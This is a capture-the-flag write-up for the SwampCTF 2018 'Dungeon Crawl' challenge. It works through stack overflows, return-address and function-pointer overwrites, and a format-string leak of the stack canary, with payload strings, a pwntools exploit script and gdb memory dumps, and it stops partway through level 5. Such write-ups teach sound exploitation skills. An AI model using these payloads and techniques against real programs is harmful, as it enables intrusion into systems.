# For Dungeon Crawl in swampctf 2018

> The nearby dungeon is full of riches, but with each level you descend, the peril increases. Will you make it to the end?
>  
> Connect
> nc chal1.swampctf.com 1337

This challenge consists of 5 different levels. All must be pwned before the flag is awarded. We start at level1 and end at level5.
We will first explore how to exploit the levels individually. After that, we will write a Python exploit script that will exploit all of them in the server given to obtain a shell.


### Level 1

Level1 is really simple.
```
0x080485e2 <+39>:	lea    eax,[ebp-0xc]
0x080485e5 <+42>:	push   eax
0x080485e6 <+43>:	push   0x8048726
0x080485eb <+48>:	call   0x80484a0 <__isoc99_scanf@plt>	; scanf("%d", store in addr [ebp-0xc])
0x080485f0 <+53>:	add    esp,0x10
0x080485f3 <+56>:	cmp    DWORD PTR [ebp-0xc],0x3da76
0x080485fa <+63>:	jne    0x8048629 <main+110>		; jump to level2 if input == 0x3da76
```

Just convert `0x3da76` to decimal (ie 252534) and we pass Level 1. On to level2.

### Level 2

```
0x080485f3 <+56>:	sub    esp,0x8
0x080485f6 <+59>:	lea    eax,[ebp-0x88]
0x080485fc <+65>:	push   eax
0x080485fd <+66>:	push   0x804874a
0x08048602 <+71>:	call   0x80484a0 <__isoc99_scanf@plt>	; scanf("%128s", store in addr [ebp-0x88])
0x08048607 <+76>:	add    esp,0x10
0x0804860a <+79>:	cmp    DWORD PTR [ebp-0xc],0xcc07c9
0x08048611 <+86>:	jne    0x8048644 <main+137>		;jump to level3 if value at addr [ebp-0xc] == 0xcc07c9
```

We want to overwrite the memory address `[ebp-0xc]` with value `0xcc07c9`. From address `[ebp-0xc]` to address `[ebp-0x88]`, there are 0x7c characters to fill.

Therefore, our input to win level2 is:
```
\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\xc9\x07\xcc\x00
```

### Level 3

There is a function called `<interact>` that calls `fread( address 0xffffce34, 1 byte, 0x89 elements, stdin)`.

Original address it returns to : `0x8048623`.

We want to return to address : `0x804862d`. This is the address of the function `<goal>`.
```
(gdb) disassemble goal
Dump of assembler code for function goal:
   0x0804862d <+0>:	push   ebp
```

`fread` reads 137 characters from stdin. The return address lies in addr `0xffffcebc`. So the 137th char overrides the last byte of the return address.
```
\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x62
```

Let's see how the input looks like in memory. See how `0x8048623` becomes `0x8048662`? The '23' became '62'.
```
(gdb) x/64x $esp
0xffffce20:	0xffffce34	0x00000001	0x00000089	0xf7faa5a0
0xffffce30:	0x00000003	0x61616161	0x61616161	0x61616161
0xffffce40:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffce50:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffce60:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffce70:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffce80:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffce90:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffcea0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffceb0:	0x61616161	0x61616161	0x61616161	0x08048662
0xffffcec0:	0xf7faa3dc	0xffffcee0	0x00000000	0xf7e10637
0xffffced0:	0xf7faa000	0xf7faa000	0x00000000	0xf7e10637
0xffffcee0:	0x00000001	0xffffcf74	0xffffcf7c	0x00000000
0xffffcef0:	0x00000000	0x00000000	0xf7faa000	0xf7ffdc04
0xffffcf00:	0xf7ffd000	0x00000000	0xf7faa000	0xf7faa000
0xffffcf10:	0x00000000	0x464aaeb6	0x7bdc80a6	0x00000000
```

So our winning input will replace '23' of `0x8048623` with '2d'.
``` 
\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x2d
```

On to level4.

### Level 4

Like previous levels, our goal is to redirect program execution to the function `goal`.
```
(gdb) disassemble goal
Dump of assembler code for function goal:
   0x0804a47c <+0>:	push   ebp
```

The only problem is I could not find a way to redirect output to it. I did not manage to solve Level 4. After the challenge ended, I decided to checkout a writeup. The rest of this "writeup" here is just an analysis of the [writeup by PwnaSonic](https://ctftime.org/writeup/9488).

This is how Level 4 works: It asks for an action, then for the player's name. 
```
$ ./level4
----- LEVEL 4 -----
Choose an action: 5
Hey traveler, what is your name? solomon
Running action 5...
Executing 78...
Result 0
Thanks for playing solomon!
```

After the player enters an action, the program asks for his/her name. The function `<get_name>` does that.
```
0x0804a4cf <+28>:	lea    eax,[ebp-0x88]
0x0804a4d5 <+34>:	push   eax
0x0804a4d6 <+35>:	push   0x804b54e
0x0804a4db <+40>:	call   0x8048580 <__isoc99_scanf@plt> ; scanf("%127s", 0xffffcdc0)
[...]
0x0804a4f7 <+68>:	lea    eax,[ebp-0x88]
0x0804a4fd <+74>:	push   eax
0x0804a4fe <+75>:	call   0x80484f0 <strdup@plt>
0x0804a503 <+80>:	add    esp,0x10
0x0804a506 <+83>:	leave  
0x0804a507 <+84>:	ret   
```
The user's name is first stored in a local variable starting from address `0xffffcdc0`. A total of 127 characters are permitted. It is then stored in the heap. The address of the name in the heap is then returned to `<main>`. This is how the user's name is printed in `'Thanks for playing <user's name>'` just before the program exits. 

The snippet below is taken from the function `<action_dispatch> `. It is in-charge of checking that no invalid actions are given as input, and jumps to a different part of the code based on what action is requested. This is because there are 100 possible different actions, and each produces a different output.
```
   0x0804995c <+6>:	    cmp    DWORD PTR [ebp+0x8],0x63
   0x08049960 <+10>:	ja     0x804a44f <action_dispatch+2809>    ; leave if action > 100
   0x08049966 <+16>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08049969 <+19>:	shl    eax,0x2
   0x0804996c <+22>:	add    eax,0x804b360
   0x08049971 <+27>:	mov    eax,DWORD PTR [eax]
   0x08049973 <+29>:	jmp    eax

```

The writeup states that the action we should choose is 73. It states that the clue lies in that choosing action 73 results in a segfault. Given an input of 7 characters, action 73 tries to call address `0x00000000` while action 5 calls the function `<execute_78>` (located in address `0x8049530`). 
```
(gdb) define hook-stop
Redefine command "hook-stop"? (y or n) y
Type commands for definition of "hook-stop".
End with a line saying just "end".
>p/x $eax
>p/x $ebp
>x/x $ebp-0xc
>end
(gdb) run
Starting program: /home/solomonbstoner/Desktop/CTF unsorted and disorganised/SwampCTF/dungeon_crawl/level4 
----- LEVEL 4 -----
Choose an action: 73
Hey traveler, what is your name? solomon
Running action 73...
$16 = 0x15
$17 = 0xffffce38
0xffffce2c:	0x00000000      ;calls address 0x00000000

[...]
```

```
(gdb) run

[...]

----- LEVEL 4 -----
Choose an action: 5
Hey traveler, what is your name? solomon
Running action 5...
$18 = 0x14
$19 = 0xffffce38
0xffffce2c:	0x08049530      ;calls address 0x8049530

Breakpoint 4, 0x0804a464 in action_dispatch ()
=> 0x0804a464 <action_dispatch+2830>:	8b 45 f4	mov    eax,DWORD PTR [ebp-0xc]
```

Let's give a longer input and see what happens. The address called by the function action_despatch can be overwritten with a long string *only with action 73*. Addresses called by other actions, such as action 5, will not be overwritten. There has to be a reason why.
```
(gdb) run

[...]

----- LEVEL 4 -----
Choose an action: 73
Hey traveler, what is your name? aaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbcccccccccccccccccccdddddddddddddddddeeeeeeeeeeeeeeeeeeeefffffffffffffffgggggggggggggggggggggggghhhhhhhhhhhhhhhhhhiiiiiiiiiiiiiiiiijjjjjjjjjjjjjjjjjjkkkkkkkkkkkkkkkkkkkkllllllllllllllllllllllll
Running action 73...
$20 = 0x15
$21 = 0xffffce38
0xffffce2c:	0x67676666      ;calls address 0x67676666

Breakpoint 4, 0x0804a464 in action_dispatch ()
=> 0x0804a464 <action_dispatch+2830>:	8b 45 f4	mov    eax,DWORD PTR [ebp-0xc]
(gdb) run

[...]
```

The way `<get_name>` stores the user's name does not change across different actions. That means there has to be something in the action itself that overrides the address called. (By action, I mean the choice of 100 actions the user ).

This is action 73.
```
0x0804a171 <+2075>:	sub    esp,0xc
0x0804a174 <+2078>:	push   0x804b109
0x0804a179 <+2083>:	call   0x8048540 <puts@plt>
0x0804a17e <+2088>:	add    esp,0x10
0x0804a181 <+2091>:	jmp    0x804a464 <action_dispatch+2830>
[...]
0x0804a464 <+2830>:	mov    eax,DWORD PTR [ebp-0xc]
0x0804a467 <+2833>:	call   eax
```

And this is action 5.
```
0x08049a01 <+171>:	sub    esp,0xc
0x08049a04 <+174>:	push   0x804ab7a
0x08049a09 <+179>:	call   0x8048540 <puts@plt>
0x08049a0e <+184>:	add    esp,0x10
0x08049a11 <+187>:	mov    DWORD PTR [ebp-0xc],0x8049530     ; 0x8049530 is the address of function <execute_78>
0x08049a18 <+194>:	jmp    0x804a464 <action_dispatch+2830>
[...]
0x0804a464 <+2830>:	mov    eax,DWORD PTR [ebp-0xc]
0x0804a467 <+2833>:	call   eax
```

Did you notice that action 5 has an additional instruction `mov    DWORD PTR [ebp-0xc],0x8049530`? This is the one that causes the program to call the function `<execute_78>` by overwriting the value at the memory address. Because action 73 does not have this instruction, DWORD PTR [ebp-0xc] will always be our input. Other actions like 71 and 72 have similar instructions.

```
Action 71:
0x804a13c <action_dispatch+2022>:	push   0x804b0df
0x804a141 <action_dispatch+2027>:	call   0x8048540 <puts@plt>
0x804a146 <action_dispatch+2032>:	add    esp,0x10
0x804a149 <action_dispatch+2035>:	mov    DWORD PTR [ebp-0xc],0x8048c50
0x804a150 <action_dispatch+2042>:	jmp    0x804a464 <action_dispatch+2830>
```
```
Action 72:
0x804a155 <action_dispatch+2047>:	sub    esp,0xc
0x804a158 <action_dispatch+2050>:	push   0x804b0f4
0x804a15d <action_dispatch+2055>:	call   0x8048540 <puts@plt>
0x804a162 <action_dispatch+2060>:	add    esp,0x10
0x804a165 <action_dispatch+2063>:	mov    DWORD PTR [ebp-0xc],0x8049134
0x804a16c <action_dispatch+2070>:	jmp    0x804a464 <action_dispatch+2830>
```

Let's take a look at the memory dump to confirm our theory. First, we will look at action 5's memory. Then, we'll talk about action 73's memory. Take note of the value at memory address `0xffffce2c`. That value will be loaded into `eip`.
```
Breakpoint 1, 0x0804a464 in action_dispatch ()
(gdb) p/x $ebp-0xc
$1 = 0xffffce2c
```

This memory dump from action 5 shows that the user's name obtained through function `<get_name>` is stored from memory address `0xffffcdc0` to address 0xffffce37`.
```
Breakpoint 5, 0x08049a01 in action_dispatch ()
=> 0x08049a01 <action_dispatch+171>:	83 ec 0c	sub    esp,0xc
(gdb) x/64xw 0xffffcdc0
0xffffcdc0:	0x6f6c6f73	0x616e6f6d	0x61616161	0x61616161
0xffffcdd0:	0x61616161	0x62616161	0x62626262	0x62626262
0xffffcde0:	0x62626262	0x62626262	0x63636362	0x63636363
0xffffcdf0:	0x63636363	0x63636363	0x64646464	0x64646464
0xffffce00:	0x64646464	0x65656564	0x65656565	0x65656565
0xffffce10:	0x66656565	0x66666666	0x66666666	0x6f736666
0xffffce20:	0x6f6d6f6c	0x6161616e	0x61616161	0x61616161
0xffffce30:	0x61616161	0x62626261	0xffffce68	0x0804a55e
```

After `0x08049a11 <+187>:	mov    DWORD PTR [ebp-0xc],0x8049530` is executed, notice that the value at memory address `0xffffce2c` has been overwritten to `0x8049530`.
```
Breakpoint 2, 0x0804a464 in action_dispatch ()
=> 0x0804a464 <action_dispatch+2830>:	8b 45 f4	mov    eax,DWORD PTR [ebp-0xc]
(gdb) x/64xw 0xffffcdc0
0xffffcdc0:	0xf7e62dd7	0xf7faa000	0x00000013	0xf7e57dfb
0xffffcdd0:	0xf7faad60	0x0000000a	0x00000013	0x62626262
0xffffcde0:	0xf7fe77eb	0xf7df7700	0x00000000	0xf7faad60
0xffffcdf0:	0xffffce38	0xf7fee010	0xf7e57cab	0x00000000
0xffffce00:	0xf7faa000	0xf7faa000	0xffffce38	0x08049a0e
0xffffce10:	0x0804ab7a	0x66666666	0x66666666	0x6f736666
0xffffce20:	0x6f6d6f6c	0x6161616e	0x61616161	0x08049530
0xffffce30:	0x61616161	0x62626261	0xffffce68	0x0804a55e
```

Now, let's compare it to action 73's memory dump. Even though the user input is different, the concept remains unchanged. As expected, `<get_name>` reads the user's name into a local variable located from address `0xffffcdc0` onwards up to address `0xffffce3e` (because only a maximum of 127 characters are read). Note that the value at memory address `0xffffce2c` is `0x61616161`.

```
Breakpoint 4, 0x0804a503 in get_name ()
=> 0x0804a503 <get_name+80>:	83 c4 10	add    esp,0x10
(gdb) x/64xw 0xffffcdc0
0xffffcdc0:	0x6f6c6f73	0x616e6f6d	0x61616161	0x61616161
0xffffcdd0:	0x61616161	0x62616161	0x62626262	0x62626262
0xffffcde0:	0x62626262	0x62626262	0x63636362	0x63636363
0xffffcdf0:	0x63636363	0x63636363	0x64646464	0x64646464
0xffffce00:	0x64646464	0x65656564	0x65656565	0x65656565
0xffffce10:	0x66656565	0x66666666	0x66666666	0x6f736666
0xffffce20:	0x6f6d6f6c	0x6161616e	0x61616161	0x61616161
0xffffce30:	0x61616161	0x62626261	0x62626262	0x00626262
0xffffce40:	0x0804b567	0xffffce58	0xffffce68	0x0804a54f
```

Nothing changes after `<get_name>` returns and `<action_dispatch>` is called. `eip` is then loaded with value `0x61616161`.
```
Breakpoint 1, 0x0804a171 in action_dispatch ()
=> 0x0804a171 <action_dispatch+2075>:	83 ec 0c	sub    esp,0xc
(gdb) x/64xw 0xffffcdc0
0xffffcdc0:	0x6f6c6f73	0x616e6f6d	0x61616161	0x61616161
0xffffcdd0:	0x61616161	0x62616161	0x62626262	0x62626262
0xffffcde0:	0x62626262	0x62626262	0x63636362	0x63636363
0xffffcdf0:	0x63636363	0x63636363	0x64646464	0x64646464
0xffffce00:	0x64646464	0x65656564	0x65656565	0x65656565
0xffffce10:	0x66656565	0x66666666	0x66666666	0x6f736666
0xffffce20:	0x6f6d6f6c	0x6161616e	0x61616161	0x61616161
0xffffce30:	0x61616161	0x62626261	0xffffce68	0x0804a55e
0xffffce40:	0x00000049	0xffffce58	0xffffce68	0x0804a54f

[...]

Breakpoint 2, 0x0804a464 in action_dispatch ()
=> 0x0804a464 <action_dispatch+2830>:	8b 45 f4	mov    eax,DWORD PTR [ebp-0xc]
(gdb) x/64xw 0xffffcdc0
0xffffcdc0:	0xf7e62dd7	0xf7faa000	0x00000014	0xf7e57dfb
0xffffcdd0:	0xf7faad60	0x0000000a	0x00000014	0x62626262
0xffffcde0:	0xf7fe77eb	0xf7df7700	0x00000000	0xf7faad60
0xffffcdf0:	0xffffce38	0xf7fee010	0xf7e57cab	0x00000000
0xffffce00:	0xf7faa000	0xf7faa000	0xffffce38	0x0804a17e
0xffffce10:	0x0804b109	0x66666666	0x66666666	0x6f736666
0xffffce20:	0x6f6d6f6c	0x6161616e	0x61616161	0x61616161

[...]

Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()
```

Now that we have a way to redirect program execution, we can execute function `<goal>`. It's address must be in memory address `0xffffce2c`. In other words, it's the 109th to 112th characters in the user input.
```
$ echo `python -c "print '73' + '\n' + 'A' * 108 + '\\x7c\\xa4\\x04\\x08'"` > input\ level4
$ cat input\ level4 | ./level4
----- LEVEL 4 -----
Choose an action: Hey traveler, what is your name? Running action 73...
Excellent reverse engineering! Level 4 complete.
----- LEVEL 5 -----
This is your final task - defeat this level and you will be rewarded.
Choose your path to victory...

Choice [0 exit][1 small][2 large][3 format]: Your chosen path leads you...straight down a mine shaft. You perish.
```

Alternatively, I could use pwntools in Python. 
```
from pwn import *

ADDR_OF_GOAL = p32(0x804a47c)

exploit = "\x61" * 108 + ADDR_OF_GOAL

p = process('./level4')
print p.recvuntil('action: ')
p.sendline('73')
log.info('Choosing action 73.')

print p.recvuntil('your name? ')
p.sendline(exploit)
log.info('Sent exploit: ' + exploit)
print('\n')
print p.recv()		#Since Level5 was started, it shows that we successfully pwned level4.
```

This is the output of running the Python script.
```
$ python input\ level4.py 
[+] Starting local process './level4': pid 6517
----- LEVEL 4 -----
Choose an action: 
[*] Choosing action 73.
Hey traveler, what is your name? 
[*] Sent exploit: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa|\xa4\x0



Running action 73...
Excellent reverse engineering! Level 4 complete.
----- LEVEL 5 -----
This is your final task - defeat this level and you will be rewarded.
Choose your path to victory...

Choice [0 exit][1 small][2 large][3 format]: 
[*] Stopped process './level4' (pid 6517)

```

Now, onwards to level5.

### Level 5

This level introduces format string vulnerability and exploit. In this level, ignoring the exit, you are given 3 choices.
Option 1 calls the function `overflow_small`, which gives you a small buffer. Option 2 calls the function `overflow_large`, which gives you a large buffer. Option 3 calls the functions `format_string`, which uses `printf` to echo whatever input you give it.
```
----- LEVEL 5 -----
This is your final task - defeat this level and you will be rewarded.
Choose your path to victory...

Choice [0 exit][1 small][2 large][3 format]: 
```

If I choose option 1, I can give input which is written to the stack. It will, however, not be echoed back to us. The stack canary is present, meaning we cannot smash the stack.
```
Choice [0 exit][1 small][2 large][3 format]: 1
Path 1 - Give yourself an extra challenge :)
a
aaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaa
*** stack smashing detected ***: ./level5 terminated
```

As shown by the assembly in gdb, we are given buffer space for 32 characters only. The function `<overflow_small>` does nothing but consume user input before returning to `<main>`.
```
0x00000000004009c1 <+33>:	lea    rdi,[rbp-0x20]
0x00000000004009c5 <+37>:	mov    edx,0x20
0x00000000004009ca <+42>:	mov    rcx,QWORD PTR [rip+0x2008bf]        # 0x601290 <stdin@@GLIBC_2.2.5>
0x00000000004009d1 <+49>:	mov    esi,0x1
0x00000000004009d6 <+54>:	sub    rdx,rdi
0x00000000004009d9 <+57>:	add    rdx,rbp
0x00000000004009dc <+60>:	call   0x400710 <fread@plt>
```


Option 2 is similar to option 1, but with a *much* larger buffer space. Since option 1 has shown that there is stack protection present, there really is no point in choosing option 2 either.
```
Choice [0 exit][1 small][2 large][3 format]: 2
Path 2 - Lots of room to play.
hhhhhhhhhhhhhhhhhhhhhh
hhhhhhh
hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh
hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh
hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh
hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh
hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh
^C
```

As shown by the assembly in gdb, we are given buffer space for 1040 characters! Like `<overflow_small>`, the function `<overflow_large>` does nothing but consume user input before returning to `<main>`.
```
0x0000000000400a24 <+36>:	lea    rdi,[rbp-0x410]
0x0000000000400a2b <+43>:	mov    edx,0x330
0x0000000000400a30 <+48>:	mov    rcx,QWORD PTR [rip+0x200859]        # 0x601290 <stdin@@GLIBC_2.2.5>
0x0000000000400a37 <+55>:	mov    esi,0x1
0x0000000000400a3c <+60>:	sub    rdx,rdi
0x0000000000400a3f <+63>:	add    rdx,rbp
0x0000000000400a42 <+66>:	call   0x400710 <fread@plt>
```

This leaves option 3. When I give an input 'w', it echos 'w'. 
```
Choice [0 exit][1 small][2 large][3 format]: 3
Path 3 - The possibilities are endless!
w
w
Still alive?
```
To test if it is `printf` that is printing the character, we can insert format strings. And oh boy, it *is*.
```
Choice [0 exit][1 small][2 large][3 format]: 3
Path 3 - The possibilities are endless!
%d
39677971
Still alive?
```

> The Format String exploit occurs when the submitted data of an input string is evaluated as a command by the application. In this way, the attacker could execute code, read the stack, or cause a segmentation fault in the running application, causing new behaviors that could compromise the security or the stability of the system.
[source](https://www.owasp.org/index.php/Format_string_attack)

We have identified a vulnerability. It is now time to determine our goal, and how we want to exploit this vulnerability to achieve it. In this level, there is *no* function `goal` to call. Why don't we create a bash shell for ourselves?

Thus far, we know our input is read into and stored in a local variable located in the stack. That means we can potentially hijack the return address. There is a stack canary present in the stack, but as the quote above states, we can always read the stack canary's value. That value will allow us to overwrite the return address. We will explore this in detail later. We also know that the stack is not executable.
```
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     10
```
That means we have to use other techniques such as [ret2libc](https://en.wikipedia.org/wiki/Return-to-libc_attack) or [ROP](https://en.wikipedia.org/wiki/Return-oriented_programming). We are given a shared library `libc.so.6`, which is the dependency of level5. That will provide us our libc functions and ROP gadgets.

Now that we have a rough idea of what we want to do, let's explore in gdb *how* we are going to do it. After we select option 3,
```
(gdb) disassemble format_string
Dump of assembler code for function format_string:
0x0000000000400a60 <+0>:	sub    rsp,0x218
0x0000000000400a67 <+7>:	mov    edi,0x400be8
0x0000000000400a6c <+12>:	mov    rax,QWORD PTR fs:0x28
0x0000000000400a75 <+21>:	mov    QWORD PTR [rsp+0x208],rax	; [rsp+0x208] is the address of the stack canary.
0x0000000000400a7d <+29>:	xor    eax,eax
0x0000000000400a7f <+31>:	call   0x400700 <puts@plt>		; "Path 3 - The possibilities are endless!"
0x0000000000400a84 <+36>:	mov    rdx,QWORD PTR [rip+0x200805]        # 0x601290 <stdin@@GLIBC_2.2.5>
0x0000000000400a8b <+43>:	mov    esi,0x1ff
0x0000000000400a90 <+48>:	mov    rdi,rsp
0x0000000000400a93 <+51>:	call   0x400780 <fgets@plt>		; fgets reads 0x1ff characters from the stdin to the top of the stack.
0x0000000000400a98 <+56>:	xor    eax,eax
0x0000000000400a9a <+58>:	mov    rdi,rsp
0x0000000000400a9d <+61>:	call   0x400740 <printf@plt>		; printf prints the user input from the top of the stack. 
0x0000000000400aa2 <+66>:	mov    rax,QWORD PTR [rsp+0x208]
0x0000000000400aaa <+74>:	xor    rax,QWORD PTR fs:0x28
0x0000000000400ab3 <+83>:	jne    0x400abd <format_string+93>
0x0000000000400ab5 <+85>:	add    rsp,0x218
0x0000000000400abc <+92>:	ret    
0x0000000000400abd <+93>:	call   0x400720 <__stack_chk_fail@plt>
End of assembler dump.
```

How do we read the stack canary value using printf?

> Instead of a decimal digit string one may write "*" or "*m$" (for some decimal integer m) to specify that the field width is given in the next argument, or in the m-th argument, respectively, which must be of type int.
[source](https://linux.die.net/man/3/printf)

We know that the stack canary is located at address `rsp+0x208`. In a way, `printf` could treat it as an argument to be printed out. Keep in mind though, now we are dealing with x64 and *not x32*. In x32, arguments are passed through the stack, while in x64, System V AMD64 ABI passes arguments through registers instead. 

```
Choice [0 exit][1 small][2 large][3 format]: 3
Path 3 - The possibilities are endless!
%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx
0x7fffffffda40:	0x2d786c25	0x2d786c25	0x2d786c25	0x2d786c25
0x7fffffffda50:	0x2d786c25	0x2d786c25	0x2d786c25	0x2d786c25
0x7fffffffda60:	0x2d786c25	0x2d786c25	0x2d786c25	0x2d786c25
0x7fffffffda70:	0x2d786c25	0x0a786c25	0x00000000	0x00000000
0x7fffffffda80:	0x00400b10	0x00000000	0xf7de6ac6	0x00007fff
0x7fffffffda90:	0x00000001	0x00000000	0x00000000	0x00000000
0x7fffffffdaa0:	0x00000000	0xff000000	0xf7a15148	0x00007fff
0x7fffffffdab0:	0xffffdc40	0x00007fff	0xf7dee923	0x00007fff
rax            0x0	0
rbx            0x0	0
rcx            0x2d786c252d786c25	3276487635844492325
rdx            0x7ffff7dd3790	140737351858064
rsi            0x602048	6299720
rdi            0x7fffffffda40	140737488345664
rbp            0x400b10	0x400b10 <__libc_csu_init>
rsp            0x7fffffffda40	0x7fffffffda40
r8             0x602048	6299720
r9             0x2d786c252d786c25	3276487635844492325
r10            0x2d786c252d786c25	3276487635844492325
r11            0x246	582
r12            0x4008a0	4196512
r13            0x7fffffffdd50	140737488346448
r14            0x0	0
r15            0x0	0
rip            0x400a9d	0x400a9d <format_string+61>
eflags         0x246	[ PF ZF IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
---Type <return> to continue, or q <return> to quit---

Breakpoint 1, 0x0000000000400a9d in format_string ()
=> 0x0000000000400a9d <format_string+61>:	e8 9e fc ff ff	call   0x400740 <printf@plt>
(gdb) c
Continuing.
602048-7ffff7dd3790-2d786c252d786c25-602048-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-a786c252d786c25-0-400b10
Still alive?
```
The output may seem confusing especially when many registers have the same values. You will notice, however, that this output agrees with [System V AMD ABI x64 calling convention in Wikipedia](https://en.wikipedia.org/wiki/X86_calling_conventions) that the 1st argument is in `rsi`, the 2nd is in `rdx`, the 3rd is in `rcx`, the 4th is in `r8`, the 5th is in `r9`, and the subsequent ones are in the stack starting from the lower memory address. The stack canary is 0x208 bytes away from the top of the stack. In other words, it's the 66th QWORD in the stack (including the one on the top of the stack). Since the first 5 arguments are in the registers, that makes the stack canary the 71st argument to `printf`. Thus, the format string we use to print its value is `%71$lx`. We use `%lx` instead of `%x` because the stack canary is 64 bits large. `%x` prints only 32 bits.

Let's check if our guess is correct. 
```
(gdb) define hook-stop
Redefine command "hook-stop"? (y or n) y
Type commands for definition of "hook-stop".
End with a line saying just "end".
>p/x $rax
>x/2xw $rsp+0x208
>end
(gdb) r
Starting program: /home/solomonbstoner/Desktop/CTF unsorted and disorganised/SwampCTF/dungeon_crawl/level5 
[...]
Choice [0 exit][1 small][2 large][3 format]: 3
Path 3 - The possibilities are endless!
%71$lx
2c7dc6248a7eac00
$3 = 0x2c7dc6248a7eac00
0x7fffffffdc48:	0x8a7eac00	0x2c7dc624

Breakpoint 2, 0x0000000000400aaa in format_string ()
=> 0x0000000000400aaa <format_string+74>:	64 48 33 04 25 28 00 00 00	xor    rax,QWORD PTR fs:0x28
(gdb) 
```
`2c7dc6248a7eac00` is the value printed out by `printf`. `$3 = 0x2c7dc6248a7eac00` is the value of `rax` after the instruction `mov    rax,QWORD PTR [rsp+0x208]` is executed. `0x7fffffffdc48:	0x8a7eac00	0x2c7dc624` is the memory dump of the stack canary itself. Since the memory dump shows the same value printed by `printf`, we know our format string is correct. We will use that value in our exploit input so that we will not change the stack canary's value, thereby bypassing the stack protection. This means we are free to override the return address from `<format_string>`. Unfortunately, `<fgets>` in `<format_string>` prevents buffer overflow by limiting user input to only 0x1ff characters.
```
0x0000000000400a8b <+43>:	mov    esi,0x1ff
0x0000000000400a90 <+48>:	mov    rdi,rsp
0x0000000000400a93 <+51>:	call   0x400780 <fgets@plt>
```
The door may be locked, but we can climb in through the window. Instead of overriding the return address of `<format_string>`, we override the return address of `<overflow_small>`. It provides a buffer 0x20 characters large, but reads 0x40 characters, so a buffer overflow here is possible. 
```
Breakpoint 4, 0x00000000004009dc in overflow_small ()
=> 0x00000000004009dc <overflow_small+60>:	e8 2f fd ff ff	call   0x400710 <fread@plt>
(gdb) info registers
[...]
rdx            0x40	64
```
